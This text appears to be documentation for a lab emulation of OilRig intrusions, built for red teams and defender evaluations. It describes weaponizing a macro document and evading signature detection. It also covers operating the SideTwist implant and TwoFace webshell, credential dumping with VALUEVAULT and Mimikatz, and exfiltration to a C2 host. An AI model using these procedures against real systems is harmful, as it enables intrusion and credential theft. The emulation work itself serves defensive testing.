Address","SQL Server","endofroad","10.1.0.7","Domain Controller","diskjockey","10.1.0.4","Exchange Server","waterfalls","10.1.0.6","Exchange Admin Workstation","theblock","10.1.0.5"]},{"i":"configure-domain-controller-diskjockey-10104","l":"Configure Domain Controller diskjockey\\ 10.1.0.4","p":["Create the user accounts as used in the scenario:","Domain Admins","Domain Users","EWS Admins, Domain Users","EWS Admins, SQL Admins, Domain Users","gosta","groups","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:","mariam","Note: in the scenario, DNS records were manually created to emulate network activity from suspect domains","Open PowerShell being sure to select \"Run as Administrator\" and run the modify-defender.ps1 script:","Open Windows Defender, toggle all nobs to the off position.","shiroyeh","shiroyeh_admin","tous","username"]},{"i":"configure-workstation-theblock-10105","l":"Configure Workstation theblock\\ 10.1.0.5","p":["Ensure Microsoft Office is installed and that you're able to edit a document. This will ensure the macros run correctly against the host.","Open PowerShell being sure to select \"Run as Administrator\" and run the modify-defender.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:"]},{"i":"configure-ews-server-waterfalls-10106","l":"Configure EWS Server waterfalls\\ 10.1.0.6","p":["Setup Exchange Server to host OWA and EAC.","Create the \"EWS Admins\" group, adding tous, gosta","Install MSSQL","Create a scheduled task to run the sql_connection.bat upon system startup:","Reboot the machine and verify connection in PowerShell:","Open Windows Defender, toggle all nobs to the off position.","In the same PowerShell window, run the modify-defender.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:"]},{"i":"configure-sql-server-endofroad-10107","l":"Configure SQL Server endofroad\\ 10.1.0.7","p":["Install MSSQL and configure data to be stored locally on the C: drive.","Create an \"SQL Admins\" domain group with tous as a member, additionally giving tous access permissions and ownership of the DB.","Sign in as tous and create a new database called sitedata.","Import the minfac.csv data file to populate the database.","Create a backup of the database to the drive for later exfiltration by the adversary","Note: For the purpose of execution, this directory was C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\","Open Windows Defender, toggle all nobs to the off position.","Open PowerShell being sure to select \"Run as Administrator\" and run the modify-defender.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:","Open port 1433 in Windows Defender Firewall","Add the \"SQL Admins\" group to Local Administrators"]}],[{"l":"Implant Build Script","p":["The provided script will automatically build SideTwist, VALUEVAULT and RDAT from a Kali Linux host. The script utilizes MingW to compile SideTwist, golang to compile VALUEVAULT, and dotnet to compile RDAT.","NOTE: RDAT requires an additional DLL to be downloaded and placed in the/Resources/RDAT directory prior to compilation. Review RDAT's documentation for instructions on retrieving this DLL.","The script should be run from the current build_implants directory.","For installing MingW:","For installing golang:","For installing dotnet:"]}],[{"l":"SideTwist Dropper","p":["Included document \"GGMS Overview.doc\" is SAFE."]},{"l":"How It Works","p":["The target downloads the malicious office document, enables macros, and closes the document. In that span of time, the document performs the following:","The Document_Open() subroutine occurs where the macro","Collects the computername and username environment variables","Performs a sandbox detection check using Application.MouseAvailable","If this fails, a popup saying \"Microsoft Visual C++ Redistributable Error: 0x801.\" This is a dummy error to inform the oeprator that something went wrong.","Creates a directory named SystemFailureReporter under the current user's AppData\\Local directory and drops the SideTwist payload (named b.doc) and update.xml into this directory.","Note: The SideTwist payload is embedded within the document under UserForm1.TextBox1.Text as base64-encoded data. Information on how to replace this payload with your own is covered in the \"Weaponization\" section.","The Document_Close() subroutine occurs when the user closes the document, where it","Performs another sandbox detection check using Application.MouseAvailable","If this fails, another dummy error pops up saying \"Microsoft Visual C++ Redistributable Error: 0x802.\"","Renames b.doc from Step 4 to SystemFailureReporter.exe","Creates the SystemFailureReporter schtask, which is set to execute every 5 minutes forever.","Note: OilRig has been known to perform DNS-based infection updates during initial access [1]. This functionality was omitted from our emulated payload due to time and resource restrictions."]},{"l":"Operator Notes","p":["The SystemFailureReporter schtask and EXE are created when the document is closed. If you're not seeing the artifacts or callbacks you expect from the maldoc, close it first and wait 5 minutes for the first scheduled execution to occur.","When opening the maldoc, you may notice an unusually long time before you see the actual contents of the document. This is okay, as the maldoc is decoding and writing the SideTwist payload to disk.","If you're searching for artifacts under the current user's AppData\\Local directory from CMD or PowerShell, be mindful of differences in how environment variables are called between CMD and PowerShell:","CMD: dir %LOCALAPPDATA%","PowerShell: ls $env:LocalAppData","If you encounter \"file/directory not found\" errors while opening or closing the maldoc, check first to see if any artifacts already exist on the target (i.e. the AppData\\Local\\SystemFailureReporter directory and the \"SystemFailureReporter\" schtask). It's plausible that the document was already detonated on that host."]},{"l":"Weaponization","p":["Add it to a compressed archive, ensuring it's password-protected to avoid detection from static signatures. This emulation plan leverages a password-protected ZIP archive, but you can choose whatever format best meets your emulation requirements.","Creating a macro","From the \"Microsoft Visual Basic for Applications\" IDE, select \"Insert > UserForm\". Within the new Toolbox window, select \"TextBox\" and draw an arbitrarily-sized box inside UserForm1.","From the \"Project\" panel, double-click on the \"ThisDocument\" object under the\"Microsoft Word Objects\" folder. Copy and paste the entirety of the payload.vbs into this new window.","Note: the frequency here is specified in minutes.","On Linux: base64 path/to/payload.exe","On WIndows (PowerShell): .\\encode-file.ps1 -payload .\\path\\to\\payload.exe","Open the .doc file you want to infect and go to \"View > Macros\". Give the macro an arbitrary name (we won't be using it), select `[Name of .doc](document) from the dropdown menu, and hit \"Create\".","Populating the Text field","Save and close the document. Your document is armed and ready for prime-time!","The malicious VBA payload can be configured to use a custom schtask payload and schtask execution frequency.","To arm a document with an EXE of your choosing:","To modify the frequency of the schtask: Go to the Document_Close() subroutine and modify the integer value within the SchTask call to one of your choosing.","Under the \"Properties\" panel, select \"TextBox1 TextBox\" from the dropdown menu and find the \"Text\" property. Base64-encode your desired payload and paste the encoded payload within this property value. Newline characters and spaces will break the payload - Make sure neither are present before proceeding to the next step.","Upload the encrypted archive to a web server you control.","UserForm and TextBox Creation"]},{"l":"Testing and Pre-Flight Checks","p":["Start the control server on 192.168.0.4, ensuring the SideTwist profile under config/handler_config.yml is set to \"Enabled\".","sudo ./controlServer","Log in to a range Windows 10 machine and ensure Defender real-time protection is set to Disabled. When in doubt, run the set-defender.ps1 script from prior ATT&CK Evaluations or manually disable this feature from the security dashboard.","Before closing the document, check to ensure all artifacts were dropped to disk under the current user's AppData\\Local directory.","SystemFailureReporter\\b.doc","SystemFailureReporter\\update.xml","Close the document and run the following from a PowerShell or CMD prompt to validate the schtask was created.","schtasks /query /TN SystemFailureReporter /V /FO LIST","With the control server open and running, run the following to manually run the SystemFailureReporter schtask. You should receive a new session:","schtasks /run /TN SystemFailureReporter"]},{"l":"Cleanup","p":["Remove the schtask for the target host:","schtasks /delete /tn SystemFailureReporter","Remove the %LOCALAPPDATA%\\SystemFailureReporter\\ directory and its contents."]},{"l":"Scenario Deployment","p":["The armed document has been zipped in a password protected archive Marketing_Materials.zip using the password !M@rk3ting! and will be hosted on the C2 server for download. An email will be sent from shirinfarhad[.]com containing the link and password to the zip file for the user to open as part of OilRig gaining initial access."]},{"l":"Cited Intelligence","p":["https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/","https://hybrid-analysis.com/sample/13c27e5049a7fc5a36416f2c1ae49c12438d45ce50a82a96d3f792bfdacf3dcd?environmentId=100"]}],[{"l":"SideTwist Dropper Tests","p":["These tests expect compilation of a TestProgram.exe. The sample code is provided and can be compiled using gcc:"]}],[{"l":"Mimikatz","p":["Mimikatz was used to list all available provider credentials using sekurlsa::logonPasswords and perform Pass-The-Hash via sekurlsa::pth.","For this scenario, no significant changes were made to the original functionality of Mimikatz.","Source code and pre-built Mimikatz can be downloaded from: https://github.com/gentilkiwi/mimikatz/"]},{"l":"Dependencies","p":["To build the binary with the following instructions, you will need the following dependencies downloaded and installed:","Microsoft Visual Studio","Windows Driver Developer Kit (WinDDK)"]},{"l":"Build Instructions","p":["From the mimikatz folder, run the following command:","The resulting executable will be found in the x64 folder created during the build process.","This executable should be renamed as m64.exe and should be copied to Resources/payloads/TwoFace."]},{"i":"cti-sources","l":"\uD83D\uDD2C CTI Sources","p":["Unit42's TwoFace Webshell: Persistent Access Point for Lateral Movement","Unit42's Striking Oil: A Closer Look at Adversary Infrastructure","Unit42's Oilrig Playbook Viewer"]},{"i":"att-ck-techniques","l":"\uD83D\uDD2C ATT&CK Techniques","p":["While Mimikatz covers a wider range of techniques, the version used in the scenario displayed the following:","(Step6) T1003.001- OS Credential Dumping: LSASS Memory","(Step8) T1550.002- Use Alternate Authentication Material: Pass the Hash"]}],[{"l":"OilRig Scenario Cleanup Procedures","p":["Clean up scripts provided will check and delete all artifacts. The script will also force reboot the host at the end of the script's execution."]},{"i":"theblock-10015","l":"THEBLOCK (10.0.1.5)","p":["RDP into THEBLOCK as follows:","Open PowerShell and select \"Run as Administrator\":"]},{"l":"Artifact List"},{"i":"sidetwist-droppersidetwist","l":"SideTwist Dropper/SideTwist","p":["SystemFailureReporter schtask","C:\\Users\\gosta\\Downloads\\Marketing_Materials.zip","C:\\Users\\gosta\\Downloads\\GGMS Overview.doc","C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter\\","(File renamed) C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter\\b.doc","C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter\\SystemFailureReporter.exe","(Removed in scenario) C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter\\update.xml"]},{"l":"VALUEVAULT","p":["(Removed in scenario) C:\\users\\gosta\\AppData\\Roaming\\b.exe","(Removed in scenario) C:\\users\\gosta\\AppData\\Roaming\\fsociety.dat"]},{"l":"Other","p":["(Removed in scenario) C:\\Users\\Public\\Downloads\\plink.exe","(Removed in scenario) C:\\Users\\Public\\contact.aspx"]},{"i":"waterfalls-10016","l":"WATERFALLS (10.0.1.6)","p":["RDP into WATERFALLS as follows:","Open PowerShell and select \"Run as Administrator\":"]},{"i":"artifact-list-1","l":"Artifact List"},{"l":"TwoFace","p":["C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\exchweb\\ews\\contact.aspx"]},{"i":"other-1","l":"Other","p":["(Removed in scenario) C:\\Windows\\System32\\m64.exe","(Removed in scenario) C:\\Windows\\Temp\\01.txt","(Removed in scenario) C:\\Windows\\System32\\ps.exe","(Removed in scenario) C:\\Windows\\temp\\Nt.dat","(Removed in scenario) C:\\Windows\\System32\\mom64.exe"]},{"i":"endofroad-10017","l":"ENDOFROAD (10.0.1.7)","p":["RDP into WATERFALLS as follows:","Open PowerShell and select \"Run as Administrator\":"]},{"i":"artifact-list-2","l":"Artifact List"},{"l":"RDAT","p":["(File renamed) C:\\ProgramData\\Nt.dat","(Removed in scenario) C:\\ProgramData\\VMware\\","(Removed in scenario) C:\\ProgramData\\VMware\\VMware.exe","C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\guest.bmp","C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\guest.bmp.tmp"]}],[{"l":"RDAT","p":["RDAT is a backdoor used by the suspected Iranian threat group OilRig. RDAT was originally identified in 2017 and targeted companies in the telecommunications sector.[1][2] This emulated version of RDAT will leverage the EWS API by loading Microsoft.Exchange.WebServices.dll. It will connect to the EWS email server and send emails with a .bmp that contains chunks of data from given file to be exfiltrated.","Microsoft.Exchange.WebServices.dll is not included by default in this repository. Follow Microsoft's documentation for retrieving the DLL from an existing installation of Exchange or for using the open source EWS Managed API. The DLL should be placed in Resources/RDAT for building the RDAT executable.","NOTE: Tests and usage assume an Exchange server has been configured for the environment and should be run from a domain joined Windows host with network access to the Exchange server. This implementation also expects a username and passowrd for a configured user that can authenticate to the Exchange server."]},{"l":"Build Instructions"},{"l":"Windows"},{"i":"download-net-60-sdk-x64-for-windows","l":"Download .NET 6.0 SDK x64 for Windows","p":["https://dotnet.microsoft.com/en-us/download/dotnet/6.0"]},{"l":"Build EXE","p":["Open a command (cmd.exe) prompt","The compiled binary should be copied to Resources\\payloads\\TwoFace for Step 8 and 10."]},{"l":"Test Instructions","p":["Open a command (cmd.exe) prompt"]},{"l":"Usage Examples","p":["Go to running directory of RDAT.exe"]},{"l":"Cleanup Instructions","p":["Go to running directory of RDAT.exe"]},{"l":"CTI Evidence","p":["[1] https://attack.mitre.org/software/S0495/[2] https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/"]}],[{"l":"SideTwist Implant"},{"l":"About","p":["The SideTwist implant consists of a single executable. In emulated execution, it only executes a single command at a time, waiting to again be called by a scheduled task. In the default execution, no arguments are required as the C2 address and port are hard-coded. This implementation contains optional arguments to make testing with it a little easier.","At a high level, the lifecycle of the implant consists of the following actions:","An additional file, update.xml, is required for execution. The implant checks the user's%LOCALAPPDATA%\\SystemFailureReporter folder and terminates if not found. The file does not need to contain anything. This is a small deviation from the CTI which used a relative path. Upon testing with scheduled tasks from the command line, it appears that the binary was being run from a different path and subsequently unable to follow the relative link. Without using an XP-compatible version of schtasks from the command line, the \"Start In\" variable seemingly cannot be set in CMD to allow for the use of relative paths."]},{"l":"Build","p":["The implant can be built in Visual Studio, with the Developer Command Prompt from VS, or with msbuild.exe which can be obtained separately from VS. Whichever option is chosen, ensure the file update.xml exists in %LOCALAPPDATA%\\SystemFailureReporter\\. For example, for user gosta, place the update.xml file in C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter. The file does not need to contain any data."]},{"l":"Developer Prompt","p":["Open a developer command prompt and navigate to the directory containing the solution file SideTwist.sln(it should be located in the same directory as the SideTwist and SideTwistTests code folders). Once there, run the following:","devenv.exe SideTwist.sln /build Release","The executable will be found in the release folder, typically located in .\\x64\\Release."]},{"l":"Run","p":["The program can be run without arguments to use the hard-coded values. These values are:","Without arguments, the implant will execute once and exit. To ease testing, additional arguments are available in the SideTwist-loopable.exe version (or by swapping out the main.cpp for the one found in SideTwist\\loopable_version). NOTE: This loopable version simply checks the local relative path for update.xml and will not work with scheduled tasks."]},{"l":"Note on Command Strings","p":["When issuing a command execution instruction (101 or 104), the default executor is CMD. Do not supply \"cmd /c\" as part of commands. For example, simply supply \"whoami\". Piping commands is acceptable. Note: CMD does not handle single quotes for paths.","All commands automatically redirect STDERR to STDOUT to capture errors.","For PowerShell, it is recommended you use Base64 encoded commands. Be sure to use the correct Base64 encoding (UTF-16LE). The command structure to the implant is as follows:","powershell -e base64goeshere","Do not include quotes, .exe, or cmd /c \"powershell.exe ...\".","If you have paths with spaces, recommend single quotes around the instruction with double quotes inside:","... 'dir c:\\program files'"]},{"l":"Example commands of each type"},{"l":"Tests","p":["Once the solution is built, there's a separate test executable in the release folder with the implant. Running that executable should produce the requisite test results. Some tests depend on local environment variables. They have been written to encompass the development range (e.g., the test will fail if run on anything other than dragon#).","The server connection is not currently mocked. This means a live C2 server is required for some tests. Furthermore, the C2 server needs to be on the hard-coded C2 server (192.168.0.4).","The test for run() can be run with a live server and no instruction supplied (e.g. initial registration of the implant).","The FileDownload test needs the implant to have already been registered and a specific task waiting: ... '102 c:\\users\\public\\test.txt|sidetwist_test.txt'. test.txt's contents do not matter, only that it's a non-empty, base64 encoded file."]}],[{"l":"TWOFACE WebShell Analog"},{"l":"Setup","p":["This file does not need to be compiled - it is a self contained (i.e., no code-behind file) C# application in aspx format. However, the default web.config file for the IIS site may require modifications, specifically to add the following line under the assemblies tag:","add assembly=Microsoft.Exchange.Diagnostics, Version=15.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35 /","For this scenario, OilRig has placed this webshell under C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\exchweb\\ews using various file names (for our purposes, contact.aspx) 1.","Default access is limited to Windows Authentication, so requests made to the page will need valid credentials for an authorized user."]},{"l":"Execution with the Shell","p":["All execution takes place via HTTP POST 1. If a GET request is sent, the C# will not execute and the visitor will be given a fake error page saying the resource cannot be found on the server. Responses to actions taken with the shell will be provided at the end of the returned page under a pre tag. If you are using PowerShell instead of cUrl to issue the request, you will need to select and expand the Content element of the response.","If Windows Authenticiation is used, cUrl commands must contain additional flags to allow for successful negotiation:--http1.1 and --ntlm. HTTPV2 does not support NTLM authentication."]},{"l":"Command Execution","p":["Command execution requires two POST parameters 1:","pro- the process to use for execution (cmd.exe or powershell.exe)","cmd- The command to execute","Commands are not URL encoded per the CTI. For complex commands, consider using Base64 and encoded PowerShell. Please note:'+' is a valid Base64 character and may be converted to a space in transit.","Examples:"]},{"l":"File Actions","p":["The webshell supports two different sets of file actions:","Upload file to the %TEMP% directory","Upload file to arbitrary path","Download file from arbitrary path","Delete file (from %TEMP% by default, or arbitrary path if supplied)"]},{"i":"temp-file-upload","l":"%TEMP% File Upload","p":["File uploads to %TEMP% ( C:\\Windows\\Temp by default) require two parameters 1:","upd- the file name to use on the victim","upb- The Base64-encoded content of the file (note: unlike encoded commands above, we have modified this command to replace spaces with '+' signs to allow for binary file uploads)","Example:"]},{"l":"Arbitrary Path File Upload","p":["This form up upload requires POST Form data and more parameters 1:","upl- the POST form field that contains the file data to write to disk","sav- the path in which to save the file","vir- boolean value to specify if this is a virtual path or physical (default)","nen- the file name on the victim(defaults to the uploaded file name)","[arbitrary] - a field containing the file information. NAME MUST MATCH THE VALUE GIVEN IN upl","Example:"]},{"l":"File Download","p":["Downloads only require a single field: don- the path to the file 1","Example:"]},{"l":"File Delete","p":["File deletes only require a single parameter: del- the name of the file to delete 1","If no path is supplied, %TEMP% will be used. Otherwise, specify path\\to\\file.ext","Examples:"]},{"l":"Testing","p":["A shell script has been provided to exercise each of the options using cUrl. The user will be prompted for a few details on where to send the requests and any authentication information (Windows Authentication only). Ensure the user running the script has write access to the directory it is being run from as a few test files will be made.","./twoface_tests.sh"]},{"l":"CTI","p":["[1] Unit 42 - TwoFace Webshell: Persistent Access Point for Lateral Movement"]}],[{"l":"VALUEVAULT","p":["VALUEVAULT is a Golang compiled version of the “Windows Vault Password Dumper” browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.[1]"]},{"l":"Quick Start"},{"l":"Build Instructions"},{"l":"Windows"},{"l":"Test Instructions","p":["To run vault unit tests:","To run db unit tests:"]},{"l":"Seed Credentials in Internet Explorer","p":["Open Internet Explorer OWA credentials:"]},{"l":"Usage Examples","p":["Will create SQLite database with output of Windows Credential Value for Internet Explorer","Execute:","Output:","Database layout:"]},{"l":"Cleanup Instructions"},{"l":"Read DB contents","p":["Requires Python3"]},{"l":"CTI Evidence","p":["[1] https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network"]},{"l":"References","p":["http://web.archive.org/web/20190316025511/http://oxid.it/downloads/vaultdump.txt","https://github.com/danieljoos/winvault","https://github.com/google/uuid","https://github.com/mattn/go-sqlite3","https://pkg.go.dev/golang.org/x/sys"]}],[{"l":"Scenario Overview","p":["Legend of symbols:","\uD83D\uDCA1 - callout notes","❗ - extremely important note","➡️ - Switching to another session","⭕ - Sign out of something","This scenario emulates OilRig TTPs based on several malware specimens either used by or associated with the OilRig actors:","SideTwist","VALUEVAULT","TwoFace","RDAT","A Note on This Document:","This all-in-one file does not include steps related to noise, which was also conducted during the week. For the purpose of the plan, presume that an active user session for Gosta is present for any SideTwist steps, necessary for the scheduled task to execute the implant. This session originated from an out-of-scope jump box"]},{"i":"step-0---setup","l":"Step 0 - Setup"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["The C2 consists of an HTTP server that hosts a dummy a Flickr error page. Commands to the implant are embedded between <script> tags. The command itself consists of a base64-encoded blob which contains an encrypted string(using simple xor encryption). Requests to the page that do not correspond to a registered implant will simply return the dummy page.","The malicious document is delivered from a separate attacking machine running postfix."]},{"i":"biohazard-procedures","l":":biohazard: Procedures","p":["\uD83D\uDCA1 RDP, do not SSH, to the Linux Attack Platform 192.168.0.4 hosting the C2 server.","Open a new terminal window and cd to the cloned repo control server:","Ensure the SideTwist handler is enabled for the server:","Result:","\uD83D\uDCA1 if the output contains enabled: false, change the value in handler_config.yml to match above.","Start the control server:","➡️ SSH to the Mail and Apache Server 192.168.0.5 to ensure the malicious document ( Marketing_Materials.zip) is in /var/www/html.","Check the file exists:","\uD83D\uDCA1 If the armed and zipped file is not there, follow the instructions for creating it then copy the zip file to /var/www/html.","Restart the Apache and Postfix services to ensure they are fresh:"]},{"i":"step-1---initial-compromise-and-persistence","l":"Step 1 - Initial Compromise and Persistence"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 1 emulates OilRig gaining initial access from user gosta downloading and opening a Microsoft Word document received from a link in a spearphishing email from team@ganjavigms.com. The malicious macro enabled in the document performs the following actions when the document is first opened:","The computername and username environment variables are collected.","A sandbox detection check is performed using Application.MouseAvailable.","The SideTwist payload is embedded within the document under UserForm1.TextBox1.Text as base64-encoded data.","Two artifacts b.doc(actually an executable) and update.xml are dropped into this directory. b.doc is the SideTwist payload and update.xml is an additional empty file that, if not present, SideTwist will terminate automatically.","When the document is closed:","Another sandbox detection check is performed using Application.MouseAvailable.","b.doc is renamed to SystemFailureReporter.exe.","A scheduled task named SystemFailureReporter is created and runs SystemFailureReporter.exe every 5 minutes.","When SystemFailureReporter.exe runs:","SystemFailureReporter.exe uses the GetUserName API, GetComputerName API, and GetDomainName API to find the current user, hostname, and domain respectively.","SystemFailureReporter.exe connects to the control server (192.168.0.4) over XOR encrypted protocol HTTP on port 443."]},{"i":"biohazard-procedures-1","l":":biohazard: Procedures","p":["➡️ RDP into THEBLOCK (10.1.0.5):","Username","Password","BOOMBOX\\gosta","d0ntGoCH4$ingW8trfalls","Open Edge and browse to https://waterfalls.boom.box/owa, login as Gosta:","\uD83D\uDCA1 There should be an unread email from team@ganjavigms.com.","Open this email and click the link to download the zipped file.","Open File Explorer and navigate to the Downloads file directory.","Unzip Marketing_Materials.zip and enter the password !M@rk3ting! when prompted","Double click the extracted word document GGMS Overview.doc, click \"enable editing\", and click \"enable content\".","❗ Wait 30 seconds then close the document.","\uD83D\uDD0D The C2 server should register a new SideTwist callback after the document is closed."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["SideTwist Dropper: SideTwist_Dropper","Dropper Payload collects environment variables: payload.vbs#L203-205","Dropper Payload sandbox detection: payload.vbs#L211","Dropper Payload directory creation: payload.vbs#L220-L225","Dropper Payload drops b.doc and update.xml: payload.vbs#L229-L235","Dropper Payload sandbox detection 2: payload.vbs#L247","Dropper Payload b.doc rename: payload.vbs#L251-L259","Dropper Payload scheduled task: payload.vbs#L140-L194","SideTwist Implant: SideTwist Implant","SideTwist collects ID info: SideTwist.cpp#L238-L280","SideTwist sets IP/port: SideTwist.cpp#L180-L219","SideTwist encrypts communications: comms.cpp#L106-L111","SideTwist XOR key: comms.h#L23"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["SideTwist: https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/","VBA coding/macros: https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/"]},{"i":"step-2---workstation-discovery","l":"Step 2 - Workstation Discovery"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 2 emulates OilRig performing a string of initial enumeration commands using the cmd spawned by SystemFailureReporter.exe.","OilRig enumerates the current user, system information, system network configuration information, domain users, domain groups, domain accounts, local groups, network connections, running processes, running services, and a registry key value to check if RDP is enabled.","At this point OilRig has discovered that the current user gosta is a member of EWS Admins, that EWS server WATERFALLS has the ip address of 10.1.0.6 and is part of the Exchange Trusted Subsystem group, and the existence of several other administrator groups, including SQL Admins of which user tous is a member."]},{"i":"biohazard-procedures-2","l":":biohazard: Procedures","p":["➡️ On Linux Attack Platform 192.168.0.4 as user saka, split the existing C2 terminal window horizontally, being careful to not terminate the server.","Right click Split Horizontally","In the bottom split window, issue the following commands to the implant, waiting until each task is accomplished before teeing the next one.","\uD83D\uDCA1 The implant will execute every 5 minutes.","Perform follow up discovery using gained information to determine gosta is a member of EWS Administrators, tous is a SQL administrator and the IP of WATERFALLS."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["SideTwist instruction parsing: SideTwist.cpp#L65-L79","SideTwist command execution: SideTwist.cpp#L102-L114"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["SideTwist: https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/","VBA coding/macros: https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/","Helminth campaigns/enumeration: https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","EWS admin/Exchange Trusted Subsystem discovery: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/"]},{"i":"step-3---workstation-low-privilege-credential-dumping","l":"Step 3 - Workstation Low Privilege Credential Dumping"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 3 emulates OilRig using SystemFailureReporter.exe to download VALUEVAULT(the executable for which is b.exe) which is then leveraged to perform a low privilege credential dumping. SystemFailureReporter.exe then uploads the VALUEVAULT dump (named fsociety.dat) back to C2 via HTTP POST request.","The output of the credential dump provides a plaintext password for the current user gosta."]},{"i":"biohazard-procedures-3","l":":biohazard: Procedures","p":["➡️ On Linux Attack Platform as saka, issue the command to download VALUEVAULT to the workstation","Issue the command to execute VALUEVAULT after it has been downloaded:","Issue the command to upload output of VALUEVAULT to C2 after it has executed:","Confirm that the credentials were obtained on C2 server."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["SideTwist file download: SideTwist.cpp#L129-L154 and comms.cpp#L78-L9","SideTwist file upload: SideTwist.cpp#L166-L178, and SideTwist.cpp#L81-> comms.cpp#L113-L12-> comms.cpp#L172-L2","VALUEVAULT: VALUEVAULT","VALUEVAULT opens Windows Vault: vault.go#L91-L97"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["SideTwist: https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/","VALUEVAULT: https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network","Open-source Windows Vault Password Dumper: http://web.archive.org/web/20190316025511/http://oxid.it/downloads/vaultdump.txt"]},{"i":"step-4---install-web-shell-on-ews","l":"Step 4 - Install Web Shell on EWS"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 4 emulates OilRig installing web shell persistence on WATERFALLS (10.1.0.6). This is accomplished by downloading the TWOFACE webshell (named contact.aspx) via SystemFailureReporter.exe; TWOFACE is then copied from THEBLOCK to WATERFALLS and hidden with attrib + h.","OilRig covers their tracks by deleting the webshell from gosta's user directory on THEBLOCK."]},{"i":"biohazard-procedures-4","l":":biohazard: Procedures","p":["The webshell is first placed on THEBLOCK (10.1.0.5) to prepare for copying via SMB to WATERFALLS.","Once in place, OilRig has copied the webshell directly into the Exchange Web Services directory.","Set the file hidden attribute on WATERFALLS and delete the webshell from THEBLOCK using SideTwist"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["TwoFace Webshell: TwoFace"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["EWS lateral movement: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/"]},{"i":"step-5---ews-discovery","l":"Step 5 - EWS Discovery"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 5 emulates OilRig using the TWOFACE webshell to perform enumeration on the EWS WATERFALLS (10.1.0.6) to discover the SQL server ENDOFROAD (10.1.0.7).","OilRig first uses the webshell to perform some initial discovery once on the host by enumerating the current user, system network configuration and system network connections.","Output of the system network connections discovery indicates an open connection to 10.1.0.7 via a port commonly associated with SQL."]},{"i":"biohazard-procedures-5","l":":biohazard: Procedures","p":["On Linux Attack Platform box, change directories to the TwoFace payload folder:","Use the webshell to enumerate the current user.","Enumerate the system network configurations.","Use the webshell to perform network discovery on WATERFALLS (10.1.0.6), discovering a connection to host 10.1.0.7 via a port commonly associated with SQL."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["TwoFace Webshell instruction parsing: contact.aspx#L12-L21","TwoFace Webshell command execution: contact.aspx#L176-L194"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["TwoFace: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/","Network discovery: https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/"]},{"i":"step-6---privileged-credential-dumping","l":"Step 6 - Privileged Credential Dumping"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 6 emulates OilRig using the webshell to download Mimikatz to WATERFALLS and using elevated privileges to dump credentials. The dumped credentials(stored in 01.txt) are exfiltrated back to the C2 ( 192.168.0.4) via the webshell.","After exfiltration is complete OilRig deletes both Mimikatz and the dumped credentials from the directory on WATERFALLS."]},{"i":"biohazard-procedures-6","l":":biohazard: Procedures","p":["Download Mimikatz to WATERFALLS (10.1.0.6).","Dump credentials using Mimikatz. Output includes creds for SQL server administrator tous.","\uD83D\uDCA1 privilege::debug has been included here to match the CTI, but is unnecessary due to the webshell running as SYSTEM.","Exfiltrate the resulting output file 01.txt to the attacker 